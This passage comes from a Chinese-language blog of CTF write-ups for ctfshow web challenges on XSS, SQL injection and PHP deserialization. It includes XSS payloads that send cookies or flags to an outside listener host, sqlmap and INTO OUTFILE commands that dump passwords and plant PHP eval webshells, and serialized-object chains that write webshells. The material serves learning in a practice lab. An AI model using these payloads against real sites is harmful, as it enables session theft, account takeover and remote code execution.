class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>payload：<code>&lt;script&gt;document.location.href=&quot;http://ip/xss.php?cookie=&quot;+document.cookie&lt;/script&gt;</code><br>传入就可以得到需要的flag了：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1695124984710-47892421-05e0-4546-83f6-31706a597d5a.png" alt="image.png"></p><h1 id="web317"><a href="#web317" class="headerlink" title="web317"></a>web317</h1><p>过滤了script，随便换一个标签名称就行了，比如input：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input onfocus=<span class="string">&quot;window.open(&#x27;http://natro92.top/xss.php?cookie=&#x27;+document.cookie)&quot;</span> autofocus&gt;</span><br></pre></td></tr></table></figure><p>通过autofocus属性执行本身的focus事件，这个向量是使焦点自动跳到输入元素上,触发焦点事件，无需用户去触发</p><h2 id="其他接入方法"><a href="#其他接入方法" class="headerlink" title="其他接入方法"></a>其他接入方法</h2><p>其他的方法：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg onload=<span class="string">&quot;window.open(&#x27;http://ip/&#x27;+document.cookie)&quot;</span>&gt;</span><br><span class="line">&lt;iframe onload=<span class="string">&quot;window.open(&#x27;http://ip/&#x27;+document.cookie)&quot;</span>&gt;&lt;/iframe&gt;</span><br><span class="line">&lt;body onload=<span class="string">&quot;window.open(&#x27;http://ip/&#x27;+document.cookie)&quot;</span>&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>用上面这种方法直接用nc接就行，或者python的服务器。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server <span class="number">39543</span></span><br></pre></td></tr></table></figure><h3 id="注意这里有一个小坑，我最开始测试，无论nc还是什么都是不行的，想了一下才想起来，vps是有防火墙的，如果你没有在阿里云或者其他云平台开放端口是打不进来的。"><a href="#注意这里有一个小坑，我最开始测试，无论nc还是什么都是不行的，想了一下才想起来，vps是有防火墙的，如果你没有在阿里云或者其他云平台开放端口是打不进来的。" class="headerlink" title="注意这里有一个小坑，我最开始测试，无论nc还是什么都是不行的，想了一下才想起来，vps是有防火墙的，如果你没有在阿里云或者其他云平台开放端口是打不进来的。"></a>注意这里有一个小坑，我最开始测试，无论nc还是什么都是不行的，想了一下才想起来，vps是有防火墙的，如果你没有在阿里云或者其他云平台开放端口是打不进来的。</h3><p>同理，使用nc也是可以达到效果的：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -vlp <span class="number">8888</span></span><br></pre></td></tr></table></figure><p>payload也就可以简便为：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input onfocus=<span class="string">&quot;window.open(&#x27;http://xxx/&#x27;+document.cookie)&quot;</span> autofocus&gt;</span><br></pre></td></tr></table></figure><p>可能慢一点，多刷新。<br>既然如此，dnslog估计也是可以用的。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1695126147714-c32fc3cd-7d65-48ae-9e80-43ef0c43a361.png" alt="image.png"></p><h1 id="web318-319"><a href="#web318-319" class="headerlink" title="web318-319"></a>web318-319</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input onfocus=<span class="string">&quot;window.open(&#x27;http://xxx/&#x27;+document.cookie)&quot;</span> autofocus&gt;</span><br></pre></td></tr></table></figure><h1 id="web320-web326"><a href="#web320-web326" class="headerlink" title="web320-web326"></a>web320-web326</h1><h3 id="过滤掉了空格"><a href="#过滤掉了空格" class="headerlink" title="过滤掉了空格"></a>过滤掉了空格</h3><p>绕过方法：</p><ul><li>TAB</li><li>/</li><li>/**/</li></ul><p>payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input<span class="comment">/**/</span>onfocus=<span class="string">&quot;window.open(&#x27;http://xxx/&#x27;+document.cookie)&quot;</span><span class="comment">/**/</span>autofocus&gt;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1695126464239-47f3ca03-ec5d-4961-9b18-3dc47b1c66a4.png" alt="image.png"></p><h1 id="web327"><a href="#web327" class="headerlink" title="web327"></a>web327</h1><p>存储型XSS，还是用之前payload。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1695197738252-7c67bfec-c105-456d-9778-42cf8a5000bd.png" alt="image.png"><br>这里需要给admin发信息，意思大概是获取admin的cookie。</p><h1 id="web328"><a href="#web328" class="headerlink" title="web328"></a>web328</h1><p>有个登录页面，但是登不上去，旁边有个注册，注册的用户管理用户名会被管理员检测到。因此将payload放入用户名中。<br>虽然没有flag，但是有cookie，尝试登录一下。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1695198046512-23757c3e-2857-4e97-bd9d-c5701b0664ed.png" alt="image.png"><br><code>PHPSESSID=7e8jf9pathne9tvgnb02kvj4h9</code><br>在hackbar中传入的cookie是临时的而且没有删除掉本地的cookie，我们需要写到存储中，并删除掉原有cookie值：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1695198320206-54b159b1-0fc0-4e57-a6d0-e07eea04be56.png" alt="image.png"><br>然后就能看到cookie了。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1695198380472-3e891c60-8ccc-4786-a7d8-df3e5e448741.png" alt="image.png"></p><h1 id="web329"><a href="#web329" class="headerlink" title="web329"></a>web329</h1><p>直接用之前的方法，得到的cookie是前一次的cookie（管理员打开之后立即退出了登录），cookie刷新了，也就失效了。<br>那直接写段js，使其执行时获取到页面的其他显示密码即可（因为管理员页面是显示密码的。）。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="title function_">querySelectorAll</span>(<span class="string">&#x27;.laytable-cell-1-0-1&#x27;</span>).<span class="title function_">forEach</span>(<span class="function"><span class="params">cell</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (cell.<span class="property">textContent</span>.<span class="title function_">startsWith</span>(<span class="string">&#x27;ctfshow&#123;&#x27;</span>)) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(cell.<span class="property">textContent</span>); </span><br><span class="line">    <span class="variable language_">window</span>.<span class="title function_">open</span>(<span class="string">&#x27;http://xxx:8888/&#x27;</span>+cell.<span class="property">textContent</span>)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>这时候我们注册测试一下。<br>为什么会没接到呢。<br>试一试wp的写法：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;$(<span class="string">&#x27;.laytable-cell-1-0-1&#x27;</span>).<span class="title function_">each</span>(<span class="keyword">function</span>(<span class="params">index,value</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(value.<span class="property">innerHTML</span>.<span class="title function_">indexOf</span>(<span class="string">&#x27;ctf&#x27;</span>+<span class="string">&#x27;show&#x27;</span>)&gt;-<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span>=<span class="string">&#x27;http://ip/a.php?cookie=&#x27;</span>+value.<span class="property">innerHTML</span>; </span><br><span class="line">    &#125;</span><br><span class="line">&#125;);&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>怪了，这种就可以传上去：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1695199660892-dbce885c-b380-4a11-8983-c83e0530ab79.png" alt="image.png"><br>这里面有文本干扰，所以在末尾添加一个<code>&#123;</code>来定向获取flag。<br>也就是：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;$(<span class="string">&#x27;.laytable-cell-1-0-1&#x27;</span>).<span class="title function_">each</span>(<span class="keyword">function</span>(<span class="params">index,value</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(value.<span class="property">innerHTML</span>.<span class="title function_">indexOf</span>(<span class="string">&#x27;ctf&#x27;</span>+<span class="string">&#x27;show&#123;&#x27;</span>)&gt;-<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span>=<span class="string">&#x27;http://xxx:8888/&#x27;</span>+value.<span class="property">innerHTML</span>; </span><br><span class="line">    &#125;</span><br><span class="line">&#125;);&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>这时就能得到flag了。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1695199955395-f485bb4c-bc69-4c16-b8bf-06f06312e8b5.png" alt="image.png"></p><h1 id="web330"><a href="#web330" class="headerlink" title="web330"></a>web330</h1><p>多了一个修改密码，直接让管理员修改密码即可。查看访问格式：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1695200054149-497ab670-7c16-4715-b514-55c39f4d48c6.png" alt="image.png"></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span>=<span class="string">&#x27;http://127.0.0.1/api/change.php?p=admin&#x27;</span>;&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1695200186447-11c87ee9-ae07-4e41-baba-a650a282c683.png" alt="image.png"><br>注意，当登录之后访问页面之后就会发现会跳转到修改的页面，手速快点复制下来。</p><h1 id="web331"><a href="#web331" class="headerlink" title="web331"></a>web331</h1><p>与上题类似，但是这里使用的是post：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1695200377250-37dbc647-5bce-4151-af0a-c34dd3f7936f.png" alt="image.png"><br>修改一下payload即可：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;$.<span class="title function_">ajax</span>(&#123;<span class="attr">url</span>:<span class="string">&#x27;api/change.php&#x27;</span>,<span class="attr">type</span>:<span class="string">&#x27;post&#x27;</span>,<span class="attr">data</span>:&#123;<span class="attr">p</span>:<span class="string">&#x27;admin&#x27;</span>&#125;&#125;);&lt;/script&gt;</span><br></pre></td></tr></table></figure><h1 id="web332"><a href="#web332" class="headerlink" title="web332"></a>web332</h1><p>为什么给admin转-99999就变成正的了，有点摸不到头脑<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1695200578624-04c33805-ec22-4736-8edf-da295212cbc1.png" alt="image.png"></p><h1 id="web333"><a href="#web333" class="headerlink" title="web333"></a>web333</h1><p>自己给自己转可以加钱，什么虚空科技。直接上脚本</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">x=<span class="number">5</span></span><br><span class="line">url=<span class="string">&quot;http://e8e0aa13-bff2-4b78-a8cb-f7c0f0e73ae2.challenge.ctf.show/api/amount.php&quot;</span></span><br><span class="line">url2=<span class="string">&quot;http://e8e0aa13-bff2-4b78-a8cb-f7c0f0e73ae2.challenge.ctf.show/api/getFlag.php&quot;</span></span><br><span class="line">headers=&#123;<span class="string">&#x27;Cookie&#x27;</span>:<span class="string">&#x27;PHPSESSID=jkvcavn3fpfel2opl4afqdcepp&#x27;</span>&#125;  #自己登录后的sessionid</span><br><span class="line"><span class="keyword">while</span> <span class="title class_">True</span>:</span><br><span class="line"><span class="title function_">print</span>(x)</span><br><span class="line">t=x-<span class="number">1</span></span><br><span class="line">data=&#123;</span><br><span class="line"><span class="string">&#x27;u&#x27;</span>:<span class="string">&#x27;user&#x27;</span>, #注册的用户名</span><br><span class="line"><span class="string">&#x27;a&#x27;</span>:<span class="title function_">str</span>(t)</span><br><span class="line">&#125;</span><br><span class="line">r=requests.<span class="title function_">post</span>(url,headers=headers,data=data)</span><br><span class="line"><span class="title function_">print</span>(r.<span class="property">text</span>)</span><br><span class="line"><span class="keyword">if</span>(x&gt;<span class="number">10000</span>):</span><br><span class="line">r2=requests.<span class="title function_">get</span>(url2,headers=headers)</span><br><span class="line"><span class="title function_">print</span>(r2.<span class="property">text</span>)</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">x+=t</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1695201085660-c75cae90-a34e-4f7c-9dbd-1dcf457ecd52.png" alt="image.png"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WriteUp </tag>
            
            <tag> CTFshow0-1 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web301-web310代码审计</title>
      <link href="/2023/09/17/web301-web310%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
      <url>/2023/09/17/web301-web310%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
      
        <content type="html"><![CDATA[<h1 id="web301-302"><a href="#web301-302" class="headerlink" title="web301-302"></a>web301-302</h1><p>上来就是登录页面，看了代码发现没有过滤，尝试使用sqlmap直接开注入。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql=&quot;select sds_password from sds_user where sds_username=&#x27;&quot;.$username.&quot;&#x27; order by id limit 1;&quot;;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1692710578502-cd8b5cd9-289d-4d3a-9320-2ac09591e7d5.png" alt="image.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://e870d81c-dd88-4dc4-b990-760221d286bb.challenge.ctf.show/checklogin.php --data &#x27;userid=1&amp;userpwd=1&#x27; -D sds -C sds_password --dump --batch</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1692712050115-fbdbfe16-279c-4760-924d-8f3686d25747.png" alt="image.png"><br>看看密码，sqlmap这个必须盲注，只盲了密码，猜账号为admin。<br>登陆成功。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1692712078604-99fbc469-4f7b-41d5-9bce-b007a63bbaa8.png" alt="image.png"><br>但是登录进入之后没啥用，似乎得写入shell。<br>之前还真没怎么用过sql写文件，这里记一下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">userid=1&#x27;+union select &quot;&lt;?php eval($_POST[1]);?&gt;&quot; into outfile &quot;/var/www/html/a.php&quot;--+&amp;userpwd=1</span><br></pre></td></tr></table></figure><p>然后直接rce即可。</p><h1 id="web303"><a href="#web303" class="headerlink" title="web303"></a>web303</h1><p>这回写不进去了，返回了一串字符。继续读代码。<br>账号估计还是<code>admin</code>，但是sqlmap进不去了，那就尝试爆破一下，真进去了还，密码就是admin。（在sql文件中有登录密码的md5的值，可以去找破解）<br>dptadd.php中有更新语句。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql=&quot;insert into sds_dpt set sds_name=&#x27;&quot;.$dpt_name.&quot;&#x27;,sds_address =&#x27;&quot;.$dpt_address.&quot;&#x27;,sds_build_date=&#x27;&quot;.$dpt_build_year.&quot;&#x27;,sds_have_safe_card=&#x27;&quot;.$dpt_has_cert.&quot;&#x27;,sds_safe_card_num=&#x27;&quot;.$dpt_cert_number.&quot;&#x27;,sds_telephone=&#x27;&quot;.$dpt_telephone_number.&quot;&#x27;;&quot;;</span><br></pre></td></tr></table></figure><p>在dpt_name里面插入语句。<br>post：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dpt_name=1&#x27;,sds_address =(select 1)#</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1692715850916-55750a4a-3948-4e0d-bb90-00b79ec1eae4.png" alt="image.png"><br>依次查询即可。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dpt_name=1&#x27;,sds_address =(select group_concat(table_name) from information_schema.tables where table_schema=database())#</span><br></pre></td></tr></table></figure><blockquote><p>sds_dpt,sds_fl9g,sds_user</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dpt_name=1&#x27;,sds_address =(select group_concat(column_name) from information_schema.columns where table_name=&quot;sds_fl9g&quot;)#</span><br></pre></td></tr></table></figure><blockquote><p>flag</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dpt_name=1&#x27;,sds_address =(select flag from sds_fl9g)#</span><br></pre></td></tr></table></figure><h1 id="web304"><a href="#web304" class="headerlink" title="web304"></a>web304</h1><p>有了waf</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function sds_waf($str)&#123;</span><br><span class="line">return preg_match(&#x27;/[0-9]|[a-z]|-/i&#x27;, $str);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是似乎上面的payload也是可以的。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dpt_name=1&#x27;, sds_address=(select group_concat(table_name) from information_schema.tables where table_schema=database())--+</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dpt_name=1&#x27;, sds_address=(select group_concat(column_name) from information_schema.columns where table_name=&quot;sds_flaag&quot;)--+</span><br></pre></td></tr></table></figure><h1 id="web305"><a href="#web305" class="headerlink" title="web305"></a>web305</h1><p>密码还是相同的，先看一眼waf：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sds_waf</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\~|\`|\!|\@|\#|\$|\%|\^|\&amp;|\*|\(|\)|\_|\+|\=|\&#123;|\&#125;|\[|\]|\;|\:|\&#x27;|\&quot;|\,|\.|\?|\/|\\\|\&lt;|\&gt;/&#x27;</span>, <span class="variable">$str</span>))&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注入感觉不太行，换个思路。<br>class.php里面似乎有反序列化漏洞。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">user</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;username=<span class="variable">$u</span>;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;password=<span class="variable">$p</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$this</span>-&gt;username, <span class="variable">$this</span>-&gt;password);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>再找他的注入点：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1692776440370-d18b7389-60e4-4c78-a4c1-c9fdbfc084a3.png" alt="image.png"><br>在checklogin.php里面，那我们直接写一个shell进去。这里需要url编码。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">user</span>(<span class="string">&#x27;1.php&#x27;</span>,<span class="string">&#x27;&lt;?php eval($_GET[1]);?&gt;&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure><p>加入到cookie里面。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user=O%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="number">22</span>user%<span class="number">22</span>%<span class="number">3</span>A2%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A8%<span class="number">3</span>A%<span class="number">22</span>username%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A5%<span class="number">3</span>A%<span class="number">221</span>.php%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A8%<span class="number">3</span>A%<span class="number">22</span>password%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A23%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">3</span>C%<span class="number">3</span>Fphp+<span class="keyword">eval</span>%<span class="number">28</span>%<span class="number">24</span>_GET%<span class="number">5</span>B1%<span class="number">5</span>D%<span class="number">29</span>%<span class="number">3</span>B%<span class="number">3</span>F%<span class="number">3</span>E%<span class="number">22</span>%<span class="number">3</span>B%<span class="number">7</span>D</span><br></pre></td></tr></table></figure><p>写了shell之后发现里面没有flag文件，那估计就是在数据库中。<br>用蚁剑连接数据库，密码是root，弱口令。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1692780896651-ce25991e-b502-4cb3-bb5b-ca641e6b0557.png" alt="image.png"></p><h1 id="web306"><a href="#web306" class="headerlink" title="web306"></a>web306</h1><h2 id="php反序列化"><a href="#php反序列化" class="headerlink" title="php反序列化"></a>php反序列化</h2><p>还是反序列化</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">log</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$title</span>=<span class="string">&#x27;log.txt&#x27;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$info</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">loginfo</span>(<span class="params"><span class="variable">$info</span></span>)</span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;info=<span class="variable language_">$this</span>-&gt;info.<span class="variable">$info</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">close</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$this</span>-&gt;title, <span class="variable">$this</span>-&gt;info);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1692783099271-9c0ed153-1fea-4ee8-995b-57a3c3dc502e.png" alt="image.png"><br>查询之后发现有一个调用close方法的位置。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dao</span></span>&#123;</span><br><span class="line"><span class="keyword">private</span> <span class="variable">$config</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="variable">$conn</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;conn-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>index里面包含了需要的文件。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1692783481714-0b44c2cf-10f0-4c57-af3b-0e0e162e724d.png" alt="image.png"><br>写一下exp：<br>注意这以下都是错的！！！！</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dao</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$config</span>;</span><br><span class="line">    <span class="comment">// 注意private 先改后修吧</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$conn</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;conn-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">log</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$title</span>=<span class="string">&#x27;log.txt&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$info</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">loginfo</span>(<span class="params"><span class="variable">$info</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;info=<span class="variable language_">$this</span>-&gt;info.<span class="variable">$info</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">close</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$this</span>-&gt;title, <span class="variable">$this</span>-&gt;info);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title function_ invoke__">log</span>();</span><br><span class="line"><span class="variable">$b</span>-&gt;title = <span class="string">&#x27;1.php&#x27;</span>;</span><br><span class="line"><span class="variable">$b</span>-&gt;info = <span class="string">&#x27;&lt;?php eval($_POST[1]);?&gt;&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">dao</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;conn = <span class="variable">$b</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span 